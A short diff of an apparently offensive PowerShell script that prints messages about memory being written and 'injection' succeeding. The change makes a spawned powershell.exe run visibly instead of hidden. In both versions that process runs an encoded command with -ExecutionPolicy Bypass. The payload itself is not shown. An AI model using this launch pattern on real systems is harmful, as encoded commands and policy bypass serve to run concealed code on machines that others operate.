@@ -65,9 +65,9 @@ Write-Host "[+] Memory Written: True" -ForegroundColor Green
 
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
-$psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encoded"
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi.CreateNoWindow = $true
+$psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
+$psi.CreateNoWindow = $false
 $ps = [System.Diagnostics.Process]::Start($psi)
 Write-Host "[???] Injection successful (Thread Handle: $($ps.Id))" -ForegroundColor Green
 
